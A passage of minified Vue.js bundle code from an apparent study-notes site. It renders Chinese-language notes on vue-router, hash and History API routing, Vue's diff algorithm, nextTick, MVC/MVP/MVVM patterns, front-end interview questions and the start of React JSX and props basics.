n._v("2、router-link 里的to 需要加v-bind")])])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])]),t("li",[t("p",[n._v("命名视图")]),t("ul",[t("li",[t("p",[n._v("作用")]),t("ul",[t("li",[n._v("可以在界面中拥有多个单独命名的视图router-view ,而不是只有一个单独的出口")])])]),t("li",[t("p",[n._v("注意事项")]),t("ul",[t("li",[n._v("1、如果router-view没有设置名字，那么默认为default")]),t("li",[n._v("2、此时的component应该为复数即components")])])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])]),t("li",[t("p",[n._v("重定向和别名")]),t("ul",[t("li",[t("p",[n._v("重定向")]),t("ul",[t("li",[t("p",[n._v("类型")]),t("ul",[t("li",[t("p",[n._v("参数为单纯的一个链接")]),t("ul",[t("li",[n._v("实例")])])]),t("li",[t("p",[n._v("参数为一个命名的路由")])]),t("li",[t("p",[n._v("参数为一个方法")])])])])])]),t("li",[t("p",[n._v("别名")]),t("ul",[t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])])])]),t("li",[t("p",[n._v("HTML5 History模式")]),t("ul",[t("li",[t("p",[n._v("好处")]),t("ul",[t("li",[n._v("vue-router默认使用的是hash模式，如果不想觉得hash模式（#）丑陋可以使用history模式；")])])]),t("li",[t("p",[n._v("注意事项")]),t("ul",[t("li",[t("p",[n._v("需要后台配置支持，否则可能会返回404了")]),t("ul",[t("li",[t("p",[n._v("后台配置例子")]),t("ul",[t("li",[n._v("实例")])])])])])])]),t("li",[t("p",[n._v("用法举例")]),t("ul",[t("li",[n._v("实例")])])]),t("li",[t("p",[n._v("其它建议")]),t("ul",[t("li",[t("p",[n._v("为了不让服务器给出404错误，可以给个警告。")]),t("ul",[t("li",[t("p",[n._v("非node.js后台")]),t("ul",[t("li",[n._v("实例")])])]),t("li",[t("p",[n._v("node.js后台")]),t("ul",[t("li",[n._v("可以在后台匹配路由，没匹配到时给出404，从而实现fallback")])])])])])])])])])])])]),t("h3",[n._v("进阶")]),t("ul",[t("li",[t("p",[n._v("导航钩子")]),t("ul",[t("li",[t("p",[n._v("作用")]),t("ul",[t("li",[n._v("用来拦截导航，让它完成跳转或取消")])])]),t("li",[t("p",[n._v("执行钩子的方式")]),t("ul",[t("li",[t("p",[n._v("全局钩子（beforeEach）")]),t("ul",[t("li",[t("p",[n._v("使用方法")]),t("ul",[t("li",[n._v("说明")])])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例--代码")]),t("li",[n._v("实例--运行结果")])])])])]),t("li",[t("p",[n._v("某个路由独享的钩子（beforeEnter）")]),t("ul",[t("li",[t("p",[n._v("与全局before钩子的方法参数一样")])]),t("li",[t("p",[n._v("使用方法")]),t("ul",[t("li",[t("p",[n._v("官网简介")])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])])])]),t("li",[t("p",[n._v("组件内的钩子（beforeRouteEnter/Update/Leave）")]),t("ul",[t("li",[t("p",[n._v("使用方法")]),t("ul",[t("li",[n._v("官网例子")])])]),t("li",[t("p",[n._v("注意事项")]),t("ul",[t("li",[n._v("使用beforeRouteEnter无法访问组件实例this；不过可以通过传一个回调给next来访问组件实例")])])])])])])])])])])])}],ha={},Sa=ha,ya=Object(u["a"])(Sa,ba,va,!1,null,"38020d37",null),fa=ya.exports,_a=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},xa=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("前后端路由及前端路由的实现")]),t("h3",[n._v("前后端路由")]),t("ul",[t("li",[t("p",[n._v("传统的服务端路由")]),t("ul",[t("li",[t("p",[n._v("根据客户端请求的不同网址，返回不同的网页内容")])]),t("li",[t("p",[n._v("现象")]),t("ul",[t("li",[n._v("1、会造成服务器压力增加")]),t("li",[n._v("2、每次都重新请求，响应较慢、用户体验下降")])])])])]),t("li",[t("p",[n._v("前端路由")]),t("ul",[t("li",[n._v("在URL地址改变的过程中，通过JS来实现不同UI之间的切换（JS对DOM的操作），而不再向服务器重新请求页面，只通过AJAX向服务端请求数据，对用户来说这种无刷新的、即时响应是更好的体验。")]),t("li",[n._v("路由是映射关系，URL与处理函数的对应关系")])])])]),t("h3",[n._v("前端路由的实现方式")]),t("ul",[t("li",[t("p",[n._v("方法一：基于hash（location.hash+hashchange事件）")]),t("ul",[t("li",[t("p",[n._v("（1）hash满足以下几个特性，才使得其可以实现前端路由")]),t("ul",[t("li",[n._v("（1）url中hash值的变化并不会重新加载页面，因为hash是用来指导浏览器行为的，对服务端是无用的，所以不会包括在http请求中。")]),t("li",[n._v("（2）hash值的改变，都会在浏览器的访问历史中增加一个记录，也就是能通过浏览器的回退、前进按钮控制hash的切换")]),t("li",[n._v("（3）我们可以通过hashchange事件，监听到hash值的变化，从而响应不同路径的逻辑处理。")]),t("li",[n._v("如此一来，我们就可以在hashchange事件里，根据hash值来更新对应的视图，但不会去重新请求页面，同时呢，也在history里增加了一条访问记录，用户也仍然可以通过前进后退键实现UI的切换。")])])]),t("li",[t("p",[n._v("（2）触发hash值的变化有两种方法")]),t("ul",[t("li",[t("p",[n._v("1、通过a标签，设置href属性，当标签点击之后，地址栏会改变，同时会触发hashchange事件")]),t("ul",[t("li",[t("a",{attrs:{href:"#kaola"}},[n._v("to KAOLA")])])])]),t("li",[t("p",[n._v("2、通过JS直接赋值给location.hash，也会改变URL，触发hashchange事件")]),t("ul",[t("li",[n._v('location.hash="#kaola"')])])])])]),t("li",[t("p",[n._v("（3）hash实现简易Router代码")]),t("ul",[t("li",[t("p",[n._v("route")]),t("ul",[t("li",[n._v("route是一条路由，是将一个URL路径和一个处理函数相关联，是一条url和函数的映射规则，如上面代码中通过原型上的route可以设置一条路由规则，将一个path和其callback关联起来。")])])]),t("li",[t("p",[n._v("routes")]),t("ul",[t("li",[n._v("router则更像是一个容器，或者说一种机制，它管理了一组route。简单来说，route只是进行了URL和函数的映射，而在当接收到一个URL之后，去路由映射表中查找相应的函数，这个过程是由router来处理的，如上面代码，Router管理传入的route，并且在hash改变的时候，根据当前的url响应其对应的函数。")])])])])])])]),t("li",[t("p",[n._v("方法二：基于History新API（history.pushState()+popState事件）")]),t("ul",[t("li",[t("p",[n._v("History对象")]),t("ul",[t("li",[t("p",[n._v("history.pushState")]),t("ul",[t("li",[t("p",[n._v("用于在浏览历史中添加历史记录,但是并不触发跳转,此方法接受三个参数")]),t("ul",[t("li",[n._v("state:一个与指定网址相关的状态对象，popstate事件触发时，该对象会传入回调函数。如果不需要这个对象，可以填null。")]),t("li",[n._v("title：新页面的标题，但是所有浏览器目前都忽略这个值，填空字符串l。")]),t("li",[n._v("url：新的URL不一定是绝对路径；如果是相对路径，它将以当前URL为基准；传入的URL与当前URL应该是同源的，否则，pushState()会抛出异常。")])])])])]),t("li",[t("p",[n._v("history.replaceState")]),t("ul",[t("li",[n._v("方法的参数与pushState方法一模一样，区别是它修改浏览历史中当前纪录,而非添加记录,同样不触发跳转。")])])]),t("li",[t("p",[n._v("popstate事件")]),t("ul",[t("li",[n._v("每当同一个文档的浏览历史（即history对象）出现变化时，就会触发popstate事件。")]),t("li",[n._v("注意，仅仅调用pushState()方法或replaceState()方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用History.back()、History.forward()、History.go()方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。")])])])])]),t("li",[t("p",[n._v("代码")]),t("ul",[t("li",[n._v("当我们在历史记录中切换时就会触发 popstate 事件，可以在事件中还原当前state对应的UI。")])])])])])]),t("h3",[n._v("监听浏览器的后退按钮事件")]),t("ul",[t("li",[t("p",[n._v("（1）如果后退是跳转到另一个全新的页面")]),t("ul",[t("li",[n._v("实际上有很多事件都会触发 onbeforeunload，比如刷新、点击链接前往新的页面等。这里应该还是在页面加载完成比如 window.onload 事件里使用 history.pushState 推一条记录进栈，同时监听 window.onpopstate 事件")])])]),t("li",[t("p",[n._v("（2）如果整个页面是一个SPA，History API模式")]),t("ul",[t("li",[n._v("使用的是 pushState/replaceState 来实现的导航，那么当浏览器回退的时候会触发 window 上的 popstate 事件。这时需要监听 window.onpopstate 事件;")])])]),t("li",[t("p",[n._v("（3）如果整个页面是一个SPA，Hash模式")]),t("ul",[t("li",[t("p",[n._v("使用的是基于 hashChange 实现的导航，那么这个时候就比较麻烦。因为页面根据 hash 正常变化跳转（导航）的时候也会触发 popstate 事件，所以不能简单的监听 popstate 事件来做出判断。")])]),t("li",[t("p",[n._v("思路")]),t("ul",[t("li",[n._v("因为后退按钮属于浏览器的UI，并不属于任何一个页面，所以如果当鼠标在当前页面外时，监听的 popstate 事件被触发，那么认为用户点击了浏览器的后退按钮 (这里的判断鼠标是否在当前页面里是通过监听 document.onmouseleave 和 document.onmouseenter事件)；另外答案里还绑定了对 Backspace 键的监听，因为某些浏览器默认当页面焦点不属于输入域时触发的是后退操作。这个方法基本可以满足大多数情况，但是如果用户是通过鼠标侧键 (常见于游戏鼠标) 来实现的后退操作，那么可能就无法监听了。")])])]),t("li",[t("p",[n._v("Location对象")]),t("ul",[t("li",[t("p",[n._v("Location.reload([bForceGet]) - 刷新当前页面")]),t("ul",[t("li",[n._v('bForceGet为可选参数， 默认为 false，从浏览器的缓存里取当前页。true，从服务端取最新的页面, 相当于客户端点击 F5("刷新") 。')])])]),t("li",[t("p",[n._v("Location.replace(url) - 当前页面跳转到指定的URL")]),t("ul",[t("li",[n._v("并且用该URL替换当前的历史纪录，这样浏览历史记录中就只有一个页面，后退按钮永远处于失效状态，用户也就无法进行后退了。")])])]),t("li",[t("p",[n._v("Location.assign(url) - 当前页面跳转到指定的URL")]),t("ul",[t("li",[n._v("和使用location.href=URL是一样的。会产生历史记录。")])])])])])])]),t("li",[t("p",[n._v("考虑前进/后退的差别")]),t("ul",[t("li",[n._v("其实前进按钮也会触发 popstate 事件。如果是使用了 HTML5 的 history api 的单页应用，可以在 pushState 的时候给要入栈的状态对象加上一个字段来区分历史栈中每个状态的先后顺序，比如 pushState({s: 'a.html', index: 0}, '', 'a.html') 和 pushState({s: 'b.html', index: 1}, '', 'b.html')，这样当点击浏览器前进后退按钮的时候我们可以通过比较 e.state.index 和当前 history.state.index 的值来判断具体是入栈还是出栈")])])])])])}],wa={},Ea=wa,Ta=Object(u["a"])(Ea,_a,xa,!1,null,"223e72ab",null),ka=Ta.exports,Ca=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},ja=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("Vue的diff算法")]),t("h3",[n._v("以对象的形式模拟树形结构")]),t("h3",[n._v("diff过程就是调用名为patch的函数，比较新旧节点，一边比较一边给真实的dom打补丁")]),t("h3",[n._v("比较新旧节点的时候，只会在同层级进行")]),t("h3",[n._v("5种节点比较情况")]),t("ul",[t("li",[n._v("oldVnode===vnode，引用一致，认为没有变化")]),t("li",[n._v("新旧节点text不为空，且不相等则将Node.textContent = vnode.text")]),t("li",[n._v("只有新的节点有子节点则在老节点中添加子节点")]),t("li",[n._v("新节点没有子节点，老节点有子节点则删除")]),t("li",[n._v("子节点不为空且不相等则updateChildren")])]),t("h3",[n._v("updateChild")]),t("ul",[t("li",[t("p",[n._v("将旧节点的子节点和新节点的子节点提取出来")])]),t("li",[t("p",[n._v("新旧节点头尾各有两个指针，变量相互比较，四种比较方式")]),t("ul",[t("li",[n._v("oldS、oldE、S、E两两做sameVnode比较，有四种比较方式，当其中两个能匹配上那么真实dom中的相应节点会移到Vnode相应的位置")]),t("li",[n._v("匹配成功后，指针往中间移动")])])]),t("li",[t("p",[n._v("上一步比较没有匹配，有key的话会用key进行比较")]),t("ul",[t("li",[n._v("根据就节点的key生成一张hash表")]),t("li",[n._v("新节点的头尾与hash表做匹配判断是都相等")]),t("li",[n._v("如果匹配成功将就节点匹配的节点移到相应的位置")]),t("li",[n._v("如果匹配不成功则直接生成新节点插入")]),t("li",[n._v("如果没有key只会进行四种比较，指针中间的节点就做不到复用了")])])]),t("li",[t("p",[n._v("结束条件")]),t("ul",[t("li",[n._v("旧节点的头指针大于尾指针则将多余的新节点根据index添加到dom中")]),t("li",[n._v("新节点的头指针大于尾指针，那么将旧节点的头尾指针之间的节点删除")])])])]),t("h3",[n._v("sameVnode")]),t("ul",[t("li",[t("p",[n._v("比较两个节点是否相同")]),t("ul",[t("li",[n._v("key相同")]),t("li",[n._v("tag（当前节点的标签名）相同")]),t("li",[n._v("isComment（是否为注释节点）相同")]),t("li",[n._v("当标签是"),t("input"),n._v("的时候，type必须相同")]),t("li",[n._v("是否data（当前节点对应的对象，包含了具体的一些数据信息，是一个VNodeData类型，可以参考VNodeData类型中的数据信息）都有定义")])])])])])}],Ma={},Ra=Ma,La=Object(u["a"])(Ra,Ca,ja,!1,null,"580ec856",null),Oa=La.exports,Aa=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Ia=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("关于前端高级工程师面试")]),t("br"),t("pre",[n._v("\r\n"),t("h5",[n._v(" 一：基础知识")]),n._v("\r\nVue 基本的双向绑定实现原理"),t("br"),n._v("\r\nvue 生命周期 每个状态差别。"),t("br"),n._v("\r\n生命周期中何时能操作提取 DOM 样式属性？何时请求 API 渲染？为什么？ 销毁之前一般要处理哪些东西？"),t("br"),n._v("\r\n为什么要处理？到底是什么原因导致这种弊端存在？"),t("br"),n._v("\r\nVue 自定义指令实现基本底层原理？"),t("br"),n._v("\r\nVue mixin 原理 你是如何使用的 ？"),t("br"),n._v("\r\n如何做到路由无改变情况下点击菜单栏，当前页面局部刷新？\r\nInject 是否用过？Observe 是否用过？（这两个问题 牵扯高级部分，水平一般的也不会问。）\r\nVue 父子，兄弟组件传参问题。有哪些方法可以实现？你能说出几种？ 跨多个打开页面数据共享呢？\r\n说出几种实现途径。不论前后端都可以说 Vue 中如何监听调用原生 window 事件？ \r\n你是如何使用 VUE，UMD？还是 cli 方式？ Cli?2.x?3.x?常用配置?差别？\r\nVuex 的根本实现原理？\r\n你说熟悉 jquery，那你能否解释一下：事件派发，事件委托的原理？\r\nVue-router 的两种模式，深度解释一下。和 H5 新的 API 有何关联？ Vue-router 的路由拦截 或者叫 守护。\r\n你在项目中如何使用？全局的，局部的，权限的。\r\nVue-router 本质上是一种什么东西？（个人认为是哈希参照表,jJSON 配置文件）\r\n你们的前后端交互数据传输，使用的什么？是否做过封装？\r\nAxios,前后拦截封装，如何发送 formdata ，文件类型数据？\r\nES6 你开发中常用的一些方法，详细解释一下。\r\nES6 和 ES5 本质底层差别不大，大部分是语法糖。你对于语法糖怎么看？\r\n闭包原理？实际开发中你是如何使用？一般用来做什么？\r\n存储问题，几种存储的区别。\r\n跨域问题，解决方案，每种方案原理？ \r\nBootstrap 等 UI 框架栅栏布局原理。\r\nFlex 几个重要属性，或者讲出来可以对实现什么？\r\n数组的常用操作？\r\nObject.assign 是深拷贝还是浅拷贝？\r\n作用域链\r\n")]),t("pre",[n._v("\r\n"),t("h5",[n._v("二扩展层面")]),n._v("\r\nJs 本身存在一定局限性，在实际开法中，可能需要自己做一些常用工具函数的封装。 \r\n你是否用过插件，或者 js 扩展库，或者讲一讲自己的常用封装。 \r\n如果让你现在写一个常用的，对象的深层拷贝，讲一讲你的思路。\r\n如果让你现在写一个常用的，对象的深层合并（并去重），讲一讲你的思路。\r\n递归，如何跳出递归？你是否用过？ 运行种换肤问题。\r\nVuecli 多入口。 一般不问。\r\nVuecli webpack 你是逗深入了解 过？ 图片压缩，代码压缩， 文件名，等，这些一般略过。\r\n目前前端开发面向终端较多，各种设备，你是否有使用过跨多端开发框架。\r\n讲一讲 （跨多端框架很重要，跨多端输出工具其次） 和你配合开发过项目的前后端交互的后台开发语言有哪些？ \r\n你们的项目如何部署的？ \r\n你是否掌握其他后端可开发语言，如果会，讲一讲你的前后端独立开发怎么进行。\r\n也会稍微问一些语言的共通性，也就是相似的地方。 \r\n（一般的中上等以上的工程师，都基本会一些其他语言）\r\n"),t("h5",[n._v("三架构层次")]),n._v("\r\n你是否有过中大型项目独立开发经验？讲一讲，你是如何进行架构设计的。\r\n代码规范层次。 你做过这么多项目，是否有过封装，有哪些方向的封装，讲一讲。\r\n如果现在让你写一套样式库，你打算如何入手。\r\n超大型项目，运行种换肤问题。\r\n页面防抖问题，说根本。\r\n你是否写过通用函数封装，讲一讲都做过哪些？功用是什么，为什么需要这种封装？ \r\n你是都对你所使用的的 UI 框架二次优化过，讲一讲。 \r\n多个项目开发，你是否认为多数项目在操作层面的代码方面上有一定的相似性，你是逗做过 抽离封装，可以跨多个项目使用。深入讲一讲。 \r\n模块化开发，狭义上来讲是说组件。深层来理解，很多东西都可以分为模块，而大型项目 不进行模块化开发，几乎不可能。\r\n请从各个方面讲一讲，如果让你负责开发超大型项目，技 术架构方面你会如何处理？或者有什么想法都可以说说。\r\n前端静态化部署。 \r\n伪静态\r\n如果一套代码 应对一百个网站，每个网站存在一定差异性，如何规划？如何同步上新？\r\nSSR 问题。  \r\n首屏优化。网络很差的情况下如何首屏优化。 \r\nCDN 加速问题。 分布式问题 如果项目需要你用前端来写爬虫，你如何规划？\r\n"),t("h5",[n._v("四工作流和管理问题")]),n._v("\r\n这个也就是聊一聊谈谈，一般很少能到这一块的。\r\n工作流和管理，一部分是你是否有过协作 开发经验、大公司开发经验、管理多人负责项目经验。\r\n"),t("h5",[n._v("五技术主管和总监")]),n._v("\r\n技术主管和总监根本和以上这些都不在一个层次，属于管理层，但是基本都是可开发出身。\r\n技术能力基本肯定是真正的全栈，多语言精通的。还要能把握方向，懂得各部分沟通交流，熟悉工作和管理流程。 \r\n小公司的 就不谈这个问题了，没那么多要求。\r\n")])])}],Da={},Pa=Da,Na=Object(u["a"])(Pa,Aa,Ia,!1,null,"d77512dc",null),qa=Na.exports,Ha=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Ba=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h3",[n._v("nextTick")]),t("ul",[t("li",[t("p",[n._v("（1）为什么要有nextTick？")]),t("ul",[t("li",[t("p",[n._v("现象")]),t("ul",[t("li",[n._v("这段脚本执行我们猜测会依次打印：1、2、3。但是实际效果中，只会输出一次：3。")])])]),t("li",[t("p",[n._v("原因")]),t("ul",[t("li",[n._v("现在有这样的一种情况，mounted的时候test的值会被++循环执行1000次。 每次++时，都会根据响应式触发setter->Dep->Watcher->update->run。 如果这时候没有异步更新视图，那么每次++都会直接操作DOM更新视图，这是非常消耗性能的。")]),t("li",[n._v("所以Vue实现了一个queue队列，在下一个Tick（或者是当前Tick的微任务阶段）的时候会统一执行queue中Watcher的run。同时，拥有相同id的Watcher不会被重复加入到该queue中去，所以不会执行1000次Watcher的run。最终更新视图只会直接将test对应的DOM的0变成1000。 保证更新视图操作DOM的动作是在当前栈执行完以后下一个Tick（或者是当前Tick的微任务阶段）的时候调用，大大优化了性能。")])])])])]),t("li",[t("p",[n._v("（2）nextTick用法示例")]),t("ul",[t("li",[n._v("模板")]),t("li",[n._v("Vue实例")]),t("li",[n._v("结果")]),t("li",[n._v("msg1和msg3显示的内容还是变换之前的，而msg2显示的内容是变换之后的。其根本原因是因为Vue中DOM更新是异步的")])])]),t("li",[t("p",[n._v("（3）nextTick的应用场景")]),t("ul",[t("li",[t("p",[n._v("1.在Vue生命周期的created()钩子函数进行的DOM操作一定要放在Vue.nextTick()的回调函数中")]),t("ul",[t("li",[n._v("在created()钩子函数执行的时候DOM 其实并未进行任何渲染，而此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进Vue.nextTick()的回调函数中。与之对应的就是mounted()钩子函数，因为该钩子函数执行时所有的DOM挂载和渲染都已完成，此时在该钩子函数中进行任何DOM操作都不会有问题 。")])])]),t("li",[t("p",[n._v("2.在数据变化后要执行的某个操作，而这个操作需要使用随数据改变而改变的DOM结构的时候，这个操作都应该放进Vue.nextTick()的回调函数中。")])])])]),t("li",[t("p",[n._v("（4）nextTick的版本区别")]),t("ul",[t("li",[n._v("在 Vue 2.4 之前的版本，nextTick 几乎都是基于 micro task 实现的，但由于 micro task 的执行优先级非常高，在某些场景下它甚至要比事件冒泡还要快，就会导致一些诡异的问题，如 issue #4521、#6690、#6566；但是如果全部都改成 macro task，对一些有重绘和动画的场景也会有性能影响，如 issue #6813。所以最终 nextTick 采取的策略是默认走 micro task，对于一些 DOM 交互事件，如 v-on 绑定的事件回调函数的处理，会强制走 macro task。")])])])])])}],Fa={},Ua=Fa,Ja=Object(u["a"])(Ua,Ha,Ba,!1,null,"5541a092",null),za=Ja.exports,Wa=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},$a=[],Ga="# mv*\r\n\r\n## MVC\r\n\r\n### MVC表面概念\r\n\r\n- Model（模型）---\x3e数据层（数据保存）\r\n\r\n\t- 需要运算的数据（以计算器为例）\r\n\r\n- View（视图）---\x3e视图层（用户界面）\r\n\r\n\t- 按钮及显示屏（以计算器为例）\r\n\r\n- Controller（控制）---\x3e控制层（业务逻辑）\r\n\r\n\t- 处理加减乘除内部的运算步骤 （以计算器为例）\r\n\r\n### 好处\r\n\r\n- 三者之间紧密联系但又相互独立，一个层面进行重构时不影响其他层面\r\n\r\n### 示意图\r\n\r\n- 从view接受指令\r\n- 从controller接受指令\r\n\r\n### 通信特点\r\n\r\n- 所有通信都是单向的\r\n\r\n## MVP\r\n\r\n### MVP表面概念\r\n\r\n- Model（模型）---\x3e数据层（数据保存）\r\n- View（视图）---\x3e视图层（用户界面）\r\n- Presenter（主持）---\x3e主持层\r\n\r\n### 示意图\r\n\r\n### 通信特点\r\n\r\n- 各部分通信都是双向的\r\n- view和model不发生关系，都是通过presenter\r\n- view非常薄，不部署任何业务逻辑，因此称为“被动视图”，即没有任何主动性。presenter非常厚，所有逻辑都部署在那里\r\n\r\n## MVVM\r\n\r\n### MVVM表面概念\r\n\r\n- Model（模型）---\x3e数据层（数据保存）\r\n- View（视图）---\x3e视图层（用户界面）\r\n- ViewModel\r\n\r\n### 示意图\r\n\r\n### 通信特点\r\n\r\n- 与MVP基本一致，唯一的区别就是MVVM采用了双向数据绑定，view的变化会自动反映在ViewModel上，反之亦然。\r\n\r\n",Va={data:function(){return{MainComponent:Ga}}},Qa=Va,Ka=Object(u["a"])(Qa,Wa,$a,!1,null,"50f98ff4",null),Xa=Ka.exports,Ya={mixins:[xn["a"]],components:{m1:Ke,m2:ta,m3:la,m4:ga,m5:fa,m6:ka,m7:Oa,m8:qa,m9:za,m10:Xa},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"mv*",value:"m10"},{label:"基本",value:"m1"},{label:"双向绑定原理",value:"m2"},{label:"监听缺陷",value:"m3"},{label:"Virtual Dom",value:"m4"},{label:"vue-router",value:"m5"},{label:"前后端路由",value:"m6"},{label:"diff算法",value:"m7"},{label:"nextTick",value:"m9"},{label:"面试",value:"m8"}]}}},Za=Ya,ni=Object(u["a"])(Za,Je,ze,!1,null,"d3dac714",null),ri=ni.exports,ti=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},ei=[],ai=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ii=[],si="# react\r\n\r\n## React\r\n\r\n### 概述\r\n\r\n- React 是一个用于构建用户界面的 JAVASCRIPT 库。\r\n- React主要用于构建UI，很人多认为 React 是 MVC 中的 V（视图）。\r\n- React 起源于 Facebook 的内部项目，用来架设 Instagram 的网站，并于 2013 年 5 月开源。\r\n- React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。\r\n\r\n### 特点\r\n\r\n- 1.声明式设计 −React采用声明范式，可以轻松描述应用。\r\n- 2.高效 −React通过对DOM的模拟，最大限度地减少与DOM的交互。\r\n- 3.灵活 −React可以与已知的库或框架很好地配合。\r\n- 4.JSX − JSX 是 JavaScript 语法的扩展。React 开发不一定使用 JSX ，但我们建议使用它。\r\n- 5.组件 − 通过 React 构建组件，使得代码更加容易得到复用，能够很好的应用在大项目的开发中。\r\n- 6.单向响应的数据流 − React 实现了单向响应的数据流，从而减少了重复代码，这也是它为什么比传统数据绑定更简单。\r\n\r\n### React JSX\r\n\r\n- JSX 是 React 的核心组成部分，它使用 XML 标记的方式去直接声明界面，界面组件之间可以互相嵌套\r\n- 优点：\r\n\r\n\t- JSX 执行更快，因为它在编译为 JavaScript 代码后进行了优化。\r\n\t- 它是类型安全的，在编译过程中就能发现错误。\r\n\t- 使用 JSX 编写模板更加简单快速。\r\n\r\n- 用法\r\n\r\n\t- JSX 看起来类似 HTML ，我们可以看下实例:\r\n\r\n\t\t- ReactDOM.render(\r\n\t<h1>Hello, world!</h1>,\r\n\tdocument.getElementById('example')\r\n);\r\n\r\n\t- 独立文件\r\n\t- JavaScript 表达式\r\n\r\n\t\t- 我们可以在 JSX 中使用 JavaScript 表达式。表达式写在花括号 {} 中。实例如下：\r\n\r\n\t\t\t- ReactDOM.render(\r\n\t<div>\r\n\t  <h1>{1+1}</h1>\r\n\t</div>\r\n\t,\r\n\tdocument.getElementById('example')\r\n);\r\n\r\n\t- 在 JSX 中不能使用 if else 语句，单可以使用 conditional (三元运算) 表达式来替代。\r\n\t- 样式\r\n\r\n\t\t- React 推荐使用内联样式。我们可以使用 camelCase 语法来设置内联样式. React 会在指定元素数字后自动添加 px 。以下实例演示了为 h1 元素添加 myStyle 内联样式：\r\n\r\n\t\t\t- var myStyle = {\r\n\tfontSize: 100,\r\n\tcolor: '#FF0000'\r\n};\r\nReactDOM.render(\r\n\t<h1 style = {myStyle}>W3Cschool教程</h1>,\r\n\tdocument.getElementById('example')\r\n);\r\n\r\n\t- 注释\r\n\r\n\t\t- 注释需要写在花括号中\r\n\r\n\t\t\t- ReactDOM.render(\r\n\t<div>\r\n    <h1>W3Cschool教程</h1>\r\n    {/*注释...*/}\r\n \t</div>,\r\n\tdocument.getElementById('example')\r\n);\r\n\r\n\t- 数组\r\n\r\n\t\t- JSX 允许在模板中插入数组，数组会自动展开所有成员：\r\n\r\n\t\t\t- var arr = [\r\n  <h1>W3Cschool教程</h1>,\r\n  <h2>从W3Cschool开始！</h2>,\r\n];\r\nReactDOM.render(\r\n  <div>{arr}</div>,\r\n  document.getElementById('example')\r\n);\r\n\r\n### State(状态)\r\n\r\n- React 把组件看成是一个状态机（State Machines）。通过与用户的交互，实现不同状态，然后渲染 UI，让用户界面和数据保持一致。\r\n\r\n\t- 当用户点击组件，导致状态变化，this.setState 方法就修改状态值，每次修改以后，自动调用 this.render 方法，再次渲染组件\r\n\r\n### Props\r\n\r\n- state 和 props 主要的区别在于 props 是不可变的，而 state 可以根据与用户交互来改变。\r\n- State 和 Props\r\n\r\n\t- 我们可以在父组件中设置 state， 并通过在子组件上使用 props 将其传递到子组件上。\r\n\r\n- Props 验证\r\n\r\n\t- Props 验证使用 propTypes，它可以保证我们的应用组件被正确使用，React.PropTypes 提供很多验证器 (validator) 来验证传入数据是否有效。当向 props 传入无效数据时，JavaScript 控制台会抛出警告。\r\n\r\n\t\t- var title = \"W3Cschool教程\";\r\n// var title = 123;\r\nvar MyTitle = React.createClass({\r\n  propTypes: {\r\n    title: React.PropTypes.string.isRequired,\r\n  },\r\n\r\n  render: function() {\r\n     return <h1> {this.props.title} </h1>;\r\n   }\r\n});\r\nReactDOM.render(\r\n    <MyTitle title={title} />,\r\n    document.getElementById('example')\r\n);\r\n\r\n\t- 更多验证器说明如下：\r\n\r\n\t\t- propTypes: {\r\n    // 可以声明 prop 为指定的 JS 基本数据类型，默认情况，这些数据是可选的\r\n   optionalArray: React.PropTypes.array,\r\n    optionalBool: React.PropTypes.bool,\r\n    optionalFunc: React.PropTypes.func,\r\n    optionalNumber: React.PropTypes.number,\r\n    optionalObject: React.PropTypes.object,\r\n    optionalString: React.PropTypes.string,\r\n\r\n    // 可以被渲染的对象 numbers, strings, elements 或 array\r\n    optionalNode: React.PropTypes.node,\r\n\r\n    //  React 元素\r\n    optionalElement: React.PropTypes.element,\r\n\r\n    // 用 JS 的 instanceof 操作符声明 prop 为类的实例。\r\n    optionalMessage: React.PropTypes.instanceOf(Message),\r\n\r\n    // 用 enum 来限制 prop 只接受指定的值。\r\n    optionalEnum: React.PropTypes.oneOf(['News', 'Photos']),\r\n\r\n    // 可以是多个对象类型中的一个\r\n    optionalUnion: React.PropTypes.oneOfType([\r\n      React.PropTypes.string,\r\n      React.PropTypes.number,\r\n      React.PropTypes.instanceOf(Message)\r\n    ]),\r\n\r\n    // 指定类型组成的数组\r\n    optionalArrayOf: React.PropTypes.arrayOf(React.PropTypes.number),\r\n\r\n    // 指定类型的属性构成的对象\r\n    optionalObjectOf: React.PropTypes.objectOf(React.PropTypes.number),\r\n\r\n    // 特定 shape 参数的对象\r\n    optionalObjectWithShape: React.PropTypes.shape({\r\n      color: React.PropTypes.string,\r\n      fontSize: React.PropTypes.number\r\n    }),\r\n\r\n    // 任意类型加上 `isRequired` 来使 prop 不可空。\r\n    requiredFunc: React.PropTypes.func.isRequired,\r\n\r\n    // 不可空的任意类型\r\n    requiredAny: React.PropTypes.any.isRequired,\r\n\r\n    // 自定义验证器。如果验证失败需要返回一个 Error 对象。不要直接使用 `console.warn` 或抛异常，因为这样 `oneOfType` 会失效。\r\n    customProp: function(props, propName, componentName) {\r\n      if (!/matchme/.test(props[propName])) {\r\n        return new Error('Validation failed!');\r\n      }\r\n    }\r\n  },\r\n\r\n### React 组件 